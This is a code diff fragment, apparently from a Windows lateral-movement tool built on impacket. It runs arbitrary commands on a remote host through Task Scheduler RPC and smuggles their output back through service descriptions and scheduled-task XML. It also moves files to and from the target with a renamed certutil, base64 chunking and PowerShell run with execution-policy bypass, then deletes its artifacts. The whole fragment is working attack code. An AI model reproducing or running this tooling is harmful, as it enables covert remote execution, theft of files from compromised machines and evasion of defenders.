+                                wrap_hSchRpcRegisterTask(tschctl, command=command, schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
+                                tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
+
+                                while True:
+                                        time.sleep(1)
+                                        motherfucker=retrive_service_description(svcctl,hService,service_desc_marker,my_codec=my_codec)
+                                        if motherfucker == '':
+                                                continue
+                                        if motherfucker.split(finish_mark, 1).__len__() >= 2:
+                                                print("cmd execution finished, trying to get echo back...")
+                                                break
+                                print("file decoding succeed, now rename it to the real name")
+                                print(f"{x} decoded succeed")
+
+
+                        # 合并文件,并删除小文件
+                        finish_mark = generate_random_string(5)
+                        command = f"copy /b {split_out_dir_on_target}\\* {dest_path}&&del /q {split_out_dir_on_target}\\*&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
+
+                        # 执行一开始预设的bat脚本，将命令结果逐行设置到服务描述中
+                        wrap_hSchRpcRegisterTask(tschctl, command=command, schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
+                        tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
+
+                        while True:
+                                time.sleep(1)
+                                motherfucker = retrive_service_description(svcctl, hService, service_desc_marker, my_codec=my_codec)
+                                if motherfucker == '':
+                                        continue
+                                if motherfucker.split(finish_mark, 1).__len__() >= 2:
+                                        print("cmd execution finished, trying to get echo back...")
+                                        break
+                        print('file upload succeed')
+                        # 清理，删除fake certutil，删除输出目录
+                        print('clearing.......')
+                        finish_mark=generate_random_string(5)
+                        command = f"del /q {fake_certutil_name}.exe&&del /q {split_out_dir_on_target}\\*&&rd /q {split_out_dir_on_target}&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
+                        wrap_cmd_exec(tschctl,command,schtasks_name,finish_mark)
+                        continue
+                # 文件下载功能，开撸
+                elif your_cmd.split('down', 1).__len__() >= 2 and your_cmd.split('down', 1)[0]=='' and our_cmd.split('down', 1)[1][0]=='$':
+                        if len(your_cmd.split('$'))!=3:
+                                print("malformed, please retype: up$src_path$dest_path")
+                                continue
+                        src_path = your_cmd.split('$', 1)[1].split('$', 1)[0]
+                        dest_path = your_cmd.split('$', 1)[1].split('$', 1)[1]
+                        if len(src_path.strip()) == 0:
+                                print("malformed, please retype: up$src_path$dest_path")
+                                continue
+                        if len(dest_path.strip()) == 0:
+                                print("malformed, please retype: up$src_path$dest_path")
+                                continue
+                        if os.path.exists(dest_path):
+                                print('file already exist')
+                                continue
+                        if not is_path_exists_or_creatable(src_path):
+                                print('src path malformed')
+                                continue
+
+                        # 首先给certutil挪个地方改个名
+                        download_fake_certutil_name = generate_random_string(5)
+                        print(f"download_fake_certutil_name is {download_fake_certutil_name}")
+                        # certutil_is_already_faked=True
+                        finish_mark = generate_random_string(5)
+                        # 同时还要创建一个输出目录，用于切分文件
+                        download_split_out_dir_on_target = generate_random_string(5)
+                        print('download_split_out_dir_on_target: ' + download_split_out_dir_on_target)
+                        # command = f"copy certutil.exe {download_fake_certutil_name}.exe&&md {download_split_out_dir_on_target}&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
+                        #
+                        # wrap_cmd_exec(tschctl,command,schtasks_name,finish_mark)
+                        # 需要写入一个对文件进行拆分的bat脚本
+                        # 然后需要对文件进行编码
+                        # 根据certutil的输出，一行是64字节，16行就是1KB，1MB就是1024*16行
+                        # base64的编码会让文件变大，这也是不得不付出的代价
+                        # 用bat脚本进行分割太慢了，慢的可怕
+                        # 转而使用powershell
+                        ps_file_name = generate_random_string(5)
+                        encoded_file_name = generate_random_string(5)
+                        out_dir = generate_random_string(5)
+
+                        powershell_finis_finisssssh_mark=write_pwershell(svcctl=svcctl, hService=hService, schtasks_name=schtasks_name, service_name=lpServiceName,
+                                                                         service_desc_marker=service_desc_marker,
+                                                                         ps_file_name=ps_file_name, encoded_file_name=encoded_file_name, out_dir=download_split_out_dir_on_target)
+                        # 对目标文件进行编码
+                        finish_mark = generate_random_string(5)
+                        command = f"certutil.exe -f -encode {src_path} {encoded_file_name}&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
+
+                        wrap_cmd_exec(tschctl, command, schtasks_name, finish_mark)
+                        # 对目标文件进行拆分
+                        #powershell -executionpolicy bypass -command "& { import-module C:\Users\123\Documents\1\Rubeus\Rubeus\1.ps1; get-domain }"
+                        command = 'powershell -executionpolicy bypass -command "& { import-module C:\\windows\\system32\\'+ps_file_name+'.ps1; get-domain }"'
+                        finish_mark = generate_random_string(5)
+
+                        wrap_hSchRpcRegisterTask(tschctl, command=command, schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
+                        tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
+                        powershell_split_count=0
+                        while True:
+                                time.sleep(1)
+                                motherfucker = retrive_service_description(svcctl, hService, service_desc_marker, my_codec=my_codec)
+                                if motherfucker == '':
+                                        continue
+                                if motherfucker.split(powershell_finis_finisssssh_mark, 1).__len__() >= 2:
+                                        powershell_split_count=int(motherfucker.replace(powershell_finis_finisssssh_mark,''))
+                                        print("cmd execution finished, trying to get echo back...")
+                                        break
+
+                        # 分割完成之后，需要按照分割的数量进行回传
+                        if os.path.exists('.'+os.path.sep+'split_for_download'):
+                                shutil.rmtree('.'+os.path.sep+'split_for_download')
+                        time.sleep(1)
+                        os.mkdir('.'+os.path.sep+'split_for_download')
+                        split_out_dir = '.'+os.path.sep+'split_for_download'
+                        for i in range(powershell_split_count-1):
+                                asadsd=i+1
+                                s = str(asadsd)
+                                padding = '0'
+                                len = 4
+                                x = s.rjust(len, padding)
+                                print(f"retriving {x}st part file...")
+
+                                finish_mark = generate_random_string(5)
+                                command = f"type {file_part_1_name} {desc_header_file_name}>{new_xml_file}&&type {new_xml_file} {download_split_out_dir_on_target}\\output_{x}>{new_xml_file}1&&type {new_xml_file}1 {desc_tail_file_name}>{new_xml_file}2&&schtasks /create /tn {schtasks_name_for_upload} /xml {new_xml_file}2 /f&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
+
+
+
+                                # command = f"schtasks /create /xml {download_split_out_dir_on_target}\\output_{x} /tn {schtasks_name} /f&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
+                                #finish_mark = generate_random_string(5)
+                                wrap_cmd_exec(tschctl, command, schtasks_name_for_upload, finish_mark)
+                                # 获取内容，简单处理后直接写入文件
+                                asd = tsch.hSchRpcRetrieveTask(tschctl, '\\%s' % schtasks_name_for_upload)
+                                xml_content = asd['pXml']
+                                xml_content=xml_content.replace("-----BEGIN CERTIFICATE-----",'')
+                                xml_content=xml_content.replace("-----END CERTIFICATE-----",'')
+                                xml_content=xml_content.strip()
+                                xml_content=xml_content.split('<Description>', 1)[1].split('</Description>', 1)[0].replace('\n','')
+                                # Open a file in write mode
+                                with open(f"{split_out_dir}\\filename.txt{x}", "w") as f:
+                                        # Write a string to the file
+                                        f.write(xml_content)
+                        #合并文件
+                        print("merging file...")
+                        import os
+
+                        # Path to the directory containing the files to merge
+                        dir_path = split_out_dir
+
+                        # Name of the file to write the merged contents to
+                        output_file = "merged_file.txt"
+
+                        # Open the output file in write mode
+                        with open(output_file, "w") as f:
+                                # Loop through all the files in the directory
+                                for filename in os.listdir(dir_path):
+                                        # Check if the file is a regular file (i.e., not a directory)
+                                        if os.path.isfile(os.path.join(dir_path, filename)):
+                                                # Open the file in read mode and append its contents to the output file
+                                                with open(os.path.join(dir_path, filename), "r") as input_file:
+                                                        f.write(input_file.read())
+                        # 解码文件
+                        import base64
+
+                        # Name of the input file
+                        input_file = "merged_file.txt"
+
+                        # Name of the output file
+                        output_file = dest_path
+
+                        # Open the input file in read mode and read its contents
+                        with open(input_file, "r") as f:
+                                encoded_data = f.read()
+
+                        # Decode the Base64-encoded data
+                        decoded_data = base64.b64decode(encoded_data)
+
+                        # Write the decoded data to the output file
+                        with open(output_file, "wb") as f:
+                                f.write(decoded_data)
+                        print("file is successfully downloaded to "+dest_path)
+
+                        # 清理，删除fake certutil，删除输出目录
+                        print('clearing.......')
+                        # 还要清理掉编码的文件
+                        finish_mark=generate_random_string(5)
+                        command = f"del /q {download_fake_certutil_name}.exe;{encoded_file_name}&&del /q {download_split_out_dir_on_target}\\*&&rd /q {download_split_out_dir_on_target}&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
+                        wrap_cmd_exec(tschctl,command,schtasks_name,finish_mark)
+                        continue
+                else:
+                        command = f'{your_cmd} > {cmd_result_file_name} 2>&1 && sc description {lpServiceName} "{service_desc_marker  + finish_mark + service_desc_marker}"||sc description {lpServiceName} "{service_desc_marker  + finish_mark + service_desc_marker}"'
+                wrap_hSchRpcRegisterTask(tschctl, command = command, schtasks_name = schtasks_name, action=tsch.TASK_UPDATE)
+                tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
+                # 循环等待，获取服务描述来判断命令执行是否已经完成
+                time_out_counter=0
+                timoutfalg=False
+                while True:
+                        time.sleep(1)
+                        time_out_counter=time_out_counter+1
+                        motherfucker=retrive_service_description(svcctl, hService, service_desc_marker, my_codec=my_codec)
+                        if time_out_counter==15:
+                                print("cmd execute timeout, try again")
+                                timoutfalg=True
+                                break
+                        if motherfucker == '':
+                                continue
+                        if motherfucker.split(finish_mark,1).__len__()>=2:
+                                print("cmd execution finished, trying to get echo back...")
+                                break
+
+                        print("waiting for cmd execution finish...")
+                if there_is_no_need_to_get_echo_back:
+                        continue
+                if timoutfalg:
+                        continue
+                # 将输出文件和拆分后的xml进行拼接，形成新的xml文件，并使用该文件修改计划任务配置
+                # 将结果进行编码，输出到{cmd_result_file_name}1文件中
+                print(f"encoding cmd output to {cmd_result_file_name}1")
+                finish_mark=generate_random_string(5)
+                command = f"certutil -f -encode {cmd_result_file_name} {cmd_result_file_name}1&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
+
+                # 执行一开始预设的bat脚本，将命令结果逐行设置到服务描述中
+                wrap_hSchRpcRegisterTask(tschctl, command=command, schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
+                tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
+                time_out_counter=0
+                while True:
+                        time.sleep(1)
+                        time_out_counter=time_out_counter+1
+                        if time_out_counter==15:
+                                print("cmd execute timeout, try again")
+                                timoutfalg=True
+                                break
+                        motherfucker=retrive_service_description(svcctl,hService,service_desc_marker,my_codec=my_codec)
+                        if motherfucker == '':
+                                continue
+                        if motherfucker.split(finish_mark, 1).__len__() >= 2:
+                                print("cmd execution finished, trying to get echo back...")
+                                break
+
+                finish_mark=generate_random_string(5)
+                command = f"type {file_part_1_name} {desc_header_file_name}>{new_xml_file}&&type {new_xml_file} {cmd_result_file_name}1>{new_xml_file}1&&type {new_xml_file}1 {desc_tail_file_name}>{new_xml_file}2&&schtasks /create /tn {schtasks_name} /xml {new_xml_file}2 /f&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
+
+                # 执行一开始预设的bat脚本，将命令结果逐行设置到服务描述中
+                wrap_hSchRpcRegisterTask(tschctl, command=command, schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
+                tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
+
+                while True:
+                        time.sleep(1)
+                        motherfucker=retrive_service_description(svcctl,hService,service_desc_marker,my_codec=my_codec)
+                        if motherfucker == '':
+                                continue
+                        if motherfucker.split(finish_mark, 1).__len__() >= 2:
+                                print("cmd execution finished, trying to get echo back...")
+                                break
+                #等待该bat脚本执行完成
+                # 通过查询计划任务的配置来获取命令回显
+
+                asd=tsch.hSchRpcRetrieveTask(tschctl, '\\%s' % schtasks_name)
+                xml_content=asd['pXml']
+                print('++++++++++++++++++++++++++++++++++++CMD ECHO++++++++++++++++++++++++++++++++++++\n\n\n\n')
+                print(base64.b64decode(xml_content.split('<Description>',1)[1].split('</Description>',1)[0].split('-----BEGIN CERTIFICATE-----',1)[1].split('-----END CERTIFICATE-----',1)[0].replace('\n','')).decode(my_codec))
+                print('++++++++++++++++++++++++++++++++++++CMD ECHO++++++++++++++++++++++++++++++++++++')
+
+
+        #删除中间文件
+        delete_inter_file(bat_file_name,copied_xml_file_name=xml_file_name,file_part_1_name=file_part_1_name,
+                          desc_header_file_name=desc_header_file_name,desc_tail_file_name=desc_tail_file_name,
+                          cmd_result_file_name=cmd_result_file_name,new_xml_file=new_xml_file,
+                          sch_backup_filename=sch_backup_filename,    fake_certutil_name = fake_certutil_name,
+                          split_out_dir_on_target=split_out_dir_on_target,
+                          servicename=lpServiceName,hService=hService,svcctl=svcctl,tschctl=tschctl,
+                          ps_file_name=ps_file_name,
+                          schtasks_name=schtasks_name,service_desc_marker=service_desc_marker)
+        # 删除bat文件产生的bat文件
+        # delete_bat_gen_file(bat_gen_bat_prefix,schtasks_name=schtasks_name,servicename=lpServiceName,hService=hService,svcctl=svcctl,tschctl=tschctl)
+
+        #删除计划任务
+        tsch.hSchRpcDelete(tschctl, '\\%s' % schtasks_name)
+        tsch.hSchRpcDelete(tschctl, '\\%s' % schtasks_name_for_upload)
+
+
+        hRDeleteService(svcctl,hService)
+
+
+        # 关闭句柄
+        hRCloseServiceHandle(svcctl,scManagerHandle)
+        #
+        svcctl.disconnect()
+        tschctl.disconnect()
+except Exception as e:
+        print('[-] error occurred')
+        print('xxxxxxxxxxxxxxxxxxxxxxxEXCEPTIONxxxxxxxxxxxxxxxxxxxxxxxxxxx')
+        print(e)
+        print(traceback.format_exc())
+        print('xxxxxxxxxxxxxxxxxxxxxxxEXCEPTIONxxxxxxxxxxxxxxxxxxxxxxxxxxx')
+        print('[*] clearing')
+        tsch.hSchRpcDelete(tschctl, '\\%s' % schtasks_name)
+        tsch.hSchRpcDelete(tschctl, '\\%s' % schtasks_name_for_upload)
+        hRDeleteService(svcctl, hService)
+
+        # 关闭句柄
+        hRCloseServiceHandle(svcctl, scManagerHandle)
